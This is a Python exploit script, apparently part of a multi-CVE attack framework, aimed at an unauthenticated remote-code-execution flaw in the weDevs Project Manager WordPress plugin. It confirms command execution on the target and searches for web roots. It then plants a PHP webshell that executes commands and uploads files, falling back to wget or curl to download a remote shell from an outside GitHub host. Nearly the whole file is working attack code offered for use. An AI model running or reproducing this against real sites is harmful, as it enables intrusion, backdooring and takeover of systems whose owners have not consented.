# -*- coding: utf-8 -*-
# CVE-2026-116512 — weDevs Project Manager <= 4.1.1 Unauth RCE
# Refactor: script standalone → callable function exploit()
# Coded by @Mushr00w  |  refactored for multi-CVE framework
import re
import time
import base64
import threading
import requests

requests.packages.urllib3.disable_warnings()

# ────────────── constants ──────────────
CT, RT = 30, 60
LOCK = threading.Lock()
DEBUG = 0

shellMarkerD7   = 'D7net'
shellMarkerUpl  = 'Mushr00w UPLOADER'
shellFileTarget = 'mushr00w_upl.php'
shellRemoteSource = 'https://raw.githubusercontent.com/Mushr00w/Shell/refs/heads/main/kerang.php'

PHP = ('<?php if(isset($_GET["Mushr00w"])){system($_GET["Mushr00w"]);exit;}'
       'if(isset($_FILES["f"])){move_uploaded_file($_FILES["f"]["tmp_name"],'
       '$_FILES["f"]["name"]);echo "UPLOADED: ".htmlspecialchars($_FILES["f"]["name"]);exit;}'
       '?><!DOCTYPE html><html><head><title>Mushr00w Uploader</title></head><body>'
       '<h2>Mushr00w UPLOADER</h2>'
       '<form method="POST" enctype="multipart/form-data">'
       '<input type="file" name="f"><input type="submit" value="Upload">'
       '</form>'
       '<form method="GET"><input type="text" name="Mushr00w" placeholder="command">'
       '<input type="submit" value="Exec"></form>'
       '</body></html>')

PATH_RE = re.compile(r"(/[^\s\"']+)")
WPC_RE  = re.compile(r"(/[^\s\"']+/wp-config\.php)")
ID_RE   = re.compile(r"uid=\d+(\([^)]*\))?")

MARKD7, MARKUPL, SHELL, URL = shellMarkerD7, shellMarkerUpl, shellFileTarget, shellRemoteSource


# ────────────── internal helpers ──────────────
def _log(msg):
    if DEBUG:
        with LOCK:
            print('[*] ' + msg)


def _dbg_lines(debug, lines):
    if debug:
        with LOCK:
            for l in lines:
                print(l)


class _Target:
    def __init__(self, raw):
        s = raw.strip()
        if not s:
            raise ValueError('empty target')
        if not s.startswith(('http://', 'https://')):
            s = 'https://' + s
        self.base = s.rstrip('/')
        self.domain = self.base.split('://', 1)[1]
        self.endpoint = self.base + '/wp-json/pm/v2/projects/1/update'
        self.pluginUrl = self.base + '/wp-content/plugins/wedevs-project-manager/readme.txt'


class _Transport:
    def __init__(self, target, debug):
        self.target = target
        self.debug = debug

    def getPlugin(self):
        try:
            r = requests.get(self.target.pluginUrl, timeout=(CT, RT), verify=False)
        except requests.RequestException as e:
            _log('plugin probe: ' + str(e))
            return 0
        if r.status_code == 200 and 'Project Manager' in r.text:
            return 1
        return 0

    def rce(self, command):
        payload = {'id': 'x|system', 'title': command}
        try:
            r = requests.post(self.target.endpoint, data=payload,
                              headers={'Content-Type': 'application/x-www-form-urlencoded'},
                              timeout=(CT, RT), verify=False)
        except requests.RequestException as e:
            _log('rce transport: ' + str(e))
            return None
        if r.status_code != 200:
            return None
        return r.text


class _Discovery:
    def __init__(self, transport):
        self.t = transport

    def webroots(self):
        out = []
        out.extend(self._fromWpConfig())
        out.extend(self._fromPwd())
        out.extend(self._fromDocRoot())
        return self._unique(out)

    def _fromWpConfig(self):
        o = self.t.rce('find / -maxdepth 6 -name wp-config.php -type f 2>/dev/null | head -1')
        m = WPC_RE.search(o or '')
        if m:
            yield m.group(1).rsplit('/', 1)[0]

    def _fromPwd(self):
        o = self.t.rce('pwd')
        m = PATH_RE.search(o or '')
        if not m:
            return
        p = m.group(1).rstrip('/')
        for marker in ('/wp-admin', '/wp-content', '/wp-includes'):
            if marker in p:
                yield p.split(marker)[0]
                break
        yield p

    def _fromDocRoot(self):
        o = self.t.rce("echo $_SERVER['DOCUMENT_ROOT']")
        m = PATH_RE.search(o or '')
        if m:
            yield m.group(1).rstrip('/')

    def _unique(self, vals):
        seen, out = set(), []
        for v in vals:
            if v and v not in seen:
                seen.add(v); out.append(v)
        return out


class _ShellLoader:
    def __init__(self, target, transport):
        self.target = target
        self.t = transport
        self.d = _Discovery(transport)
        self.encoded = base64.b64encode(PHP.encode()).decode()
        self.escaped = PHP.replace("'", "'\\''")

    def upload(self):
        roots = self.d.webroots()
        if not roots:
            return None
        _log('webroots: ' + ', '.join(roots))
        for root in roots:
            o = self.t.rce('find ' + root + ' -type d 2>/dev/null')
            if not o:
                continue
            for d in PATH_RE.findall(o):
                d = d.rstrip('/')
                path = d + '/' + SHELL
                url = self._try(root, d, path)
                if url:
                    return url
        return None

    def _attempts(self, path):
        yield ('base64', 'echo ' + self.encoded + ' | base64 -d > ' + path + ' && echo WROTE')
        yield ('printf', "printf '%s' '" + self.escaped + "' > " + path + ' && echo WROTE')
        yield ('php_fpc', 'php -r "file_put_contents(\'' + path + '\', base64_decode(\'' + self.encoded + '\'));" && echo WROTE')
        yield ('wget', 'wget -q -O ' + path + ' ' + URL + ' && echo WROTE')
        yield ('curl', 'curl -s -o ' + path + ' ' + URL + ' && echo WROTE')

    def _try(self, root, directory, path):
        for name, cmd in self._attempts(path):
            _log('attempt ' + name + ' -> ' + path)
            o = self.t.rce(cmd)
            if not o or 'WROTE' not in o:
                continue
            rel = directory[len(root):].lstrip('/')
            probe = self.target.base + '/' + (rel + '/' if rel else '') + SHELL
            try:
                r = requests.get(probe, timeout=(CT, RT), verify=False)
            except requests.RequestException:
                continue
            if r.status_code == 200 and (MARKUPL in r.text or MARKD7 in r.text):
                return probe
        return None


# ────────────── PUBLIC FUNCTION ──────────────
def exploit(target_url, shell=False, debug=False, timeout=(30, 60)):
    """
    Exploit CVE-2026-116512 (weDevs Project Manager <= 4.1.1 unauth RCE).

    Args:
        target_url : str — 'http://x.com', 'x.com', 'https://x.com/'
        shell      : bool — kalau True, coba upload webshell setelah RCE verified
        debug      : bool — print debug info
        timeout    : tuple (connect, read)

    Returns:
        dict dengan keys:
          target, cve, plugin, endpoint, http_status,
          vulnerable, rce_verified, output, shell_url, marker, detail, exploited

        exploited = True HANYA jika ada evidence nyata (RCE verified + output,
        atau shell_url valid saat shell=True).
    """
    global DEBUG, CT, RT
    DEBUG = 1 if debug else 0
    CT, RT = timeout

    result = {
        'target': target_url,
        'cve': 'CVE-2026-116512',
        'plugin': 'not detected',
        'endpoint': None,
        'http_status': None,
        'vulnerable': False,
        'rce_verified': 'NO',
        'output': '',
        'shell_url': '',
        'marker': '',
        'detail': '',
        'exploited': False,
    }

    # 1. validate target
    try:
        t = _Target(target_url)
    except ValueError as e:
        result['detail'] = str(e)
        return result
    result['target'] = t.base
    result['endpoint'] = t.endpoint

    transport = _Transport(t, DEBUG)

    # 2. plugin detection (informational, tidak menentukan vulnerable)
    if transport.getPlugin():
        result['plugin'] = 'detected'

    # 3. RCE verify via `id`
    body = transport.rce('id')
    if body is None:
        result['detail'] = 'rce failed (no HTTP 200)'
        return result
    result['http_status'] = 200

    IND = ('uid=', 'www-data', 'root:', 'bin/bash', 'bin/sh', 'gid=', 'groups=')
    has_ind = any(i in body.lower() for i in IND)
    id_match = ID_RE.search(body)
    if not has_ind and not id_match:
        result['detail'] = 'rce indicator not found'
        return result

    # RCE confirmed
    result['vulnerable'] = True
    result['rce_verified'] = 'YES'
    for line in body.splitlines():
        if 'uid=' in line or 'gid=' in line or 'groups=' in line:
            result['output'] = line.strip()[:300]
            break
    if not result['output']:
        result['output'] = (id_match.group(0) if id_match else body.strip()[:200])

    # 4. shell upload (optional)
    if shell:
        loader = _ShellLoader(t, transport)
        shell_url = loader.upload()
        if shell_url:
            result['shell_url'] = shell_url
            result['marker'] = MARKUPL
            result['rce_verified'] = 'UPLOADER'
            # verify exec via shell
            try:
                r = requests.get(shell_url + '?Mushr00w=id', timeout=(CT, RT), verify=False)
                if r.text.strip():
                    result['output'] = r.text.strip()[:300]
                    result['rce_verified'] = 'SHELL EXEC'
                    result['exploited'] = True
                else:
                    result['exploited'] = True   # uploader valid = exploited
            except requests.RequestException:
                result['exploited'] = True       # uploader valid = exploited
        else:
            result['marker'] = 'NO'
            result['detail'] = 'rce confirmed, shell upload failed'
            result['exploited'] = True           # RCE itself = exploited
    else:
        # non-shell mode: RCE verified = exploited, evidence = output
        result['exploited'] = True
        result['detail'] = 'rce confirmed'

    return result